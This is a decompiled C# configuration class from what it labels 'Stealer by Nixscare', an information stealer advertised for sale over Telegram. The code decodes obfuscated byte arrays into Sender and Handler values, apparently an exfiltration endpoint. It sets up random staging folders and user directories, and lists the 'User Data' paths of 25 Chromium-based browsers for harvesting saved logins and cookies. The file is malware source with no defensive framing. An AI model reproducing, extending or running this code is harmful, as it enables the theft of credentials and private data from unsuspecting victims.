using System;
using System.IO;
using System.Text;

// Token: 0x02000016 RID: 22
public class Buffer
{
	// Token: 0x06000035 RID: 53 RVA: 0x00004AC8 File Offset: 0x00002CC8
	public static void Start()
	{
		global::Buffer.Sender = Encoding.GetEncoding(1251).GetString(new byte[]
		{
			99,
			71,
			57,
			49,
			98,
			71,
			120,
			112,
			90,
			50,
			104,
			48,
			76
		});
		global::Buffer.Handler = Encoding.GetEncoding(1251).GetString(new byte[]
		{
			110,
			74,
			49,
			76,
			50,
			104,
			104,
			98,
			109,
			82,
			115,
			90,
			83,
			53,
			119,
			97,
			72,
			65
		});
		global::Buffer.path_l = string.Format("{0}\\", CreateDir.create(GetRandom.String(null, 8), null, null));
		global::Buffer.path_p = string.Format("{0}\\", CreateDir.create(GetRandom.String(null, 8), null, null));
		global::Buffer.path_t = Path.GetTempPath();
		global::Buffer.path_ad = string.Format("{0}\\", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		global::Buffer.path_lad = string.Format("{0}\\", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
		global::Buffer.path_ds = string.Format("{0}\\", Environment.GetFolderPath(Environment.SpecialFolder.Personal));
		global::Buffer.path_dp = string.Format("{0}\\", Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory));
		global::Buffer.head = string.Format("Stealer by Nixscare, buy here: @nixscare (telegram){0}{1}", Environment.NewLine, Environment.NewLine);
		global::Buffer.XBufferData = new string[]
		{
			"",
			"",
			"",
			"",
			"",
			"",
			"",
			"",
			"",
			"",
			"",
			"",
			"",
			"",
			"",
			"",
			"",
			"",
			""
		};
	}

	// Token: 0x04000007 RID: 7
	public static string Sender;

	// Token: 0x04000008 RID: 8
	public static string Handler;

	// Token: 0x04000009 RID: 9
	public static string path_l;

	// Token: 0x0400000A RID: 10
	public static string path_p;

	// Token: 0x0400000B RID: 11
	public static string path_t;

	// Token: 0x0400000C RID: 12
	public static string path_lad;

	// Token: 0x0400000D RID: 13
	public static string path_ad;

	// Token: 0x0400000E RID: 14
	public static string path_ds;

	// Token: 0x0400000F RID: 15
	public static string path_dp;

	// Token: 0x04000010 RID: 16
	public static string head;

	// Token: 0x04000011 RID: 17
	public static string[] XBufferData;

	// Token: 0x04000012 RID: 18
	public static string[] string_0 = new string[]
	{
		"google",
		"yandex",
		"opera software",
		"amigo",
		"orbitum",
		"kometa",
		"maxthon",
		"torch",
		"epic browser",
		"comodo",
		"ucozmedia",
		"centbrowser",
		"go!",
		"sputnik",
		"titan browser",
		"acwebbrowser",
		"vivaldi",
		"flock",
		"srware iron",
		"sleipnir",
		"rockmelt",
		"baidu spark",
		"coolnovo",
		"blackhawk",
		"maplestudio"
	};

	// Token: 0x04000013 RID: 19
	public static string[] BrowList2 = new string[]
	{
		"Google\\Chrome\\User Data",
		"Yandex\\YandexBrowser\\User Data",
		"Opera Software\\Opera Stable",
		"Amigo\\User\\User Data",
		"Orbitum\\User Data",
		"Kometa\\User Data",
		"Maxthon\\User Data",
		"Torch\\User Data",
		"Epic Browser\\User Data",
		"Comodo\\Dragon\\User Data",
		"uCozMedia\\Uran\\User Data",
		"CentBrowser\\User Data",
		"Go!\\User Data",
		"Sputnik\\User Data",
		"Titan Browser\\User Data",
		"AcWebBrowser\\User Data",
		"Vivaldi\\User Data",
		"Flock\\User Data",
		"SRWare Iron\\User Data",
		"Sleipnir\\User Data",
		"Rockmelt\\User Data",
		"Baidu Spark\\User Data",
		"CoolNovo\\User Data",
		"BlackHawk\\User Data",
		"MapleStudio\\ChromePlus\\User Data"
	};
}
